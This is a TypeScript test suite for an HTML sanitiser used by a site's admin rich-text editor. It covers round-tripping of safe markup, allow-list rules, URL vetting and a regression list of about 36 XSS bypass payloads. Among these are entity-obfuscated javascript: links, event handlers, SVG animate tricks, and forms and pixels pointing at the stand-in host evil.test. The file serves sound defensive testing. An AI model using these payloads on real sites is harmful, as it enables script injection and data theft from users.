import assert from "node:assert/strict";
import test from "node:test";
import { isAllowedUrl, readRichText, sanitiseRichText } from "../worker/admin/rich-text.ts";

/* ------------------------------------------------------------------ *
 * Pass-through: the stored markup carries the site's own classes and
 * attributes, and a sanitiser that "tidied" it would change live pages.
 * ------------------------------------------------------------------ */

test("markup the sanitiser does not touch round-trips byte-for-byte", async () => {
  const html =
    '<div class="blog-body"><h2 id="x">Venues</h2><p>Udaipur &amp; Jaipur &mdash; <em>the</em> "classics".</p>' +
    '<img src="/storage/hotels/a.jpg" alt="A &quot;quoted&quot; caption" loading="lazy"></div>';
  assert.equal(await sanitiseRichText(html), html);
});

test("tables, lists and code round-trip", async () => {
  const html =
    '<ul><li>One</li></ul><table><thead><tr><th colspan="2" scope="col">H</th></tr></thead>' +
    '<tbody><tr><td>a</td><td>b</td></tr></tbody></table><pre><code>const a = 1;</code></pre>';
  assert.equal(await sanitiseRichText(html), html);
});

test("safe links and inline styles round-trip", async () => {
  const html =
    '<p><a href="https://viraayaweddings.com/x">abs</a> <a href="/destination-wedding/agra/">rel</a> ' +
    '<a href="mailto:a@b.com">mail</a> <a href="tel:+911234567890">tel</a> <a href="#faq">frag</a></p>' +
    '<div style="text-align:center;color:#8a6d1f"><strong>Bold</strong></div>';
  assert.equal(await sanitiseRichText(html), html);
});

test("media library images and their attributes survive", async () => {
  const html = '<img src="/media/ab12.jpg" srcset="/media/ab12.jpg 1x, /media/cd34.jpg 2x" alt="v" width="800" height="600">';
  assert.equal(await sanitiseRichText(html), html);
});

test("empty input is safe", async () => {
  assert.equal(await sanitiseRichText(""), "");
});

/* ------------------------------------------------------------------ *
 * Allow-list policy.
 * ------------------------------------------------------------------ */

test("an unknown element is unwrapped, keeping its text", async () => {
  assert.equal(await sanitiseRichText("<p>a <thingy>kept</thingy> b</p>"), "<p>a kept b</p>");
});

test("an unknown attribute is dropped", async () => {
  assert.equal(await sanitiseRichText('<p contenteditable="true" class="k">a</p>'), '<p class="k">a</p>');
});

test("aria- and data- attributes are kept", async () => {
  const html = '<p data-slot="intro" aria-label="Intro" role="note">a</p>';
  assert.equal(await sanitiseRichText(html), html);
});

test("target=_blank gains rel=noopener", async () => {
  const out = await sanitiseRichText('<a href="/x" target="_blank">x</a>');
  assert.match(out, /rel="noopener noreferrer"/);
});

test("a target other than _blank is dropped", async () => {
  assert.equal(await sanitiseRichText('<a href="/x" target="evil">x</a>'), '<a href="/x">x</a>');
});

/* ------------------------------------------------------------------ *
 * Regression: every payload that walked past the previous deny-list.
 *
 * The old sanitiser removed `script`, `base`, `on*`, `srcdoc` and a few URL
 * schemes and passed everything else. Each of these was confirmed to survive
 * it intact. `forbidden` is what must not appear in the output.
 * ------------------------------------------------------------------ */

const BYPASSES = [
  ["named-entity colon in href", '<a href="javascript&colon;alert(1)">x</a>', ["javascript", "alert"]],
  ["named-entity tab in scheme", '<a href="java&Tab;script:alert(1)">x</a>', ["script:", "alert"]],
  ["named-entity newline in scheme", '<a href="java&NewLine;script:alert(1)">x</a>', ["script:", "alert"]],
  ["nested ampersand encoding", '<a href="javascript&amp;colon;alert(1)">x</a>', ["alert"]],
  ["numeric entity colon", '<a href="javascript&#58;alert(1)">x</a>', ["alert"]],
  ["hex entity scheme", '<a href="&#x6a;avascript:alert(1)">x</a>', ["alert"]],
  ["plain javascript url", '<a href="javascript:alert(1)">x</a>', ["javascript:"]],
  ["data text/html url", '<a href="data:text/html,x">x</a>', ["data:text/html"]],
  ["protocol-relative href", '<a href="//evil.test/x">x</a>', ["evil.test"]],
  ["event handler", '<p onclick="alert(1)">x</p>', ["onclick", "alert"]],
  ["img onerror", '<img src="/media/a.jpg" onerror="alert(1)">', ["onerror", "alert"]],
  ["script element", "<p>a</p><script>steal()</script>", ["script", "steal"]],
  ["base element", '<base href="https://evil.test/"><p>a</p>', ["base", "evil.test"]],
  ["meta refresh", '<meta http-equiv="refresh" content="0;url=https://evil.test">', ["refresh", "evil.test"]],
  ["style element", "<style>body{display:none}</style>", ["style", "display:none"]],
  ["external stylesheet", '<link rel="stylesheet" href="https://evil.test/x.css">', ["stylesheet", "evil.test"]],
  ["svg animate href", '<svg><a><animate attributeName="href" values="javascript:alert(1)"/></a></svg>', ["animate", "javascript:"]],
  ["svg set attributeName", '<svg><a><set attributeName="href" to="javascript:alert(1)"/></a></svg>', ["<set", "javascript:"]],
  ["iframe src", '<iframe src="https://evil.test/"></iframe>', ["iframe", "evil.test"]],
  ["iframe srcdoc", '<iframe srcdoc="x"></iframe>', ["srcdoc", "iframe"]],
  ["object data", '<object data="data:image/svg+xml;base64,PHN2Zz4="></object>', ["object", "data:image"]],
  ["embed", '<embed src="https://evil.test/x.swf">', ["embed", "evil.test"]],
  ["external form", '<form action="https://evil.test/steal"><input name="a"></form>', ["form", "evil.test", "input"]],
  ["button formaction", '<form><button formaction="https://evil.test/x">Go</button></form>', ["formaction", "evil.test"]],
  ["unquoted external img src", "<img src=https://evil.test/pixel.png>", ["evil.test"]],
  ["external srcset candidate", '<img src="/media/a.jpg" srcset="https://evil.test/x.png 2x">', ["evil.test"]],
  ["style attribute url()", '<div style="background:url(https://evil.test/t.png)">x</div>', ["evil.test", "url("]],
  ["style attribute expression()", '<div style="width:expression(alert(1))">x</div>', ["expression"]],
  ["anchor ping", '<a href="/x" ping="https://evil.test/log">x</a>', ["ping", "evil.test"]],
  ["math xlink href", '<math><maction xlink:href="javascript:alert(1)">x</maction></math>', ["javascript:", "maction"]],
  ["noscript wrapper", "<noscript><img src=x onerror=alert(1)></noscript>", ["onerror", "alert"]],
  ["title rawtext", "<title><img src=x onerror=alert(1)></title>", ["onerror", "alert"]],
  ["template", "<template><script>alert(1)</script></template>", ["template", "alert"]],
  ["marquee onstart", '<marquee onstart="alert(1)">x</marquee>', ["marquee", "onstart"]],
  ["video source onerror", '<video><source onerror="alert(1)" src="x"></video>', ["onerror", "video"]],
  ["autofocus input", "<input autofocus onfocus=alert(1)>", ["input", "onfocus"]],
];

for (const [name, payload, forbidden] of BYPASSES) {
  test(`bypass is closed: ${name}`, async () => {
    const out = (await sanitiseRichText(payload)).toLowerCase();
    for (const needle of forbidden) {
      assert.ok(!out.includes(needle.toLowerCase()), `"${needle}" survived in: ${out}`);
    }
  });
}

/* ------------------------------------------------------------------ *
 * URL policy in isolation.
 * ------------------------------------------------------------------ */

test("isAllowedUrl accepts site-relative and listed schemes", () => {
  for (const url of ["/a/b", "#x", "?q=1", "a/b.html", "https://x.test/", "http://x.test/", "mailto:a@b.c", "tel:+91123"]) {
    assert.ok(isAllowedUrl(url), url);
  }
});

test("isAllowedUrl refuses everything else", () => {
  for (const url of [
    "javascript:alert(1)",
    "javascript&colon;alert(1)",
    "java&Tab;script:alert(1)",
    "data:text/html,x",
    "vbscript:msgbox",
    "blob:https://x.test/1",
    "//evil.test/x",
    "",
  ]) {
    assert.ok(!isAllowedUrl(url), url);
  }
});

test("an unresolved character reference in a URL is refused", () => {
  assert.ok(!isAllowedUrl("java&SomeUnknownRef;script:alert(1)"));
});

/* ------------------------------------------------------------------ *
 * readRichText.
 * ------------------------------------------------------------------ */

test("readRichText reports an image hosted elsewhere", async () => {
  const result = await readRichText('<img src="https://evil.test/x.png">', "The article body");
  assert.ok("error" in result);
  assert.match(result.error, /hosted somewhere else/);
});

test("readRichText accepts local images", async () => {
  const result = await readRichText('<img src="/media/a.jpg">', "The article body");
  assert.ok("html" in result);
});

test("readRichText refuses markup over the size bound", async () => {
  const result = await readRichText(`<p>${"a".repeat(200_001)}</p>`, "The article body");
  assert.ok("error" in result);
  assert.match(result.error, /too long/);
});
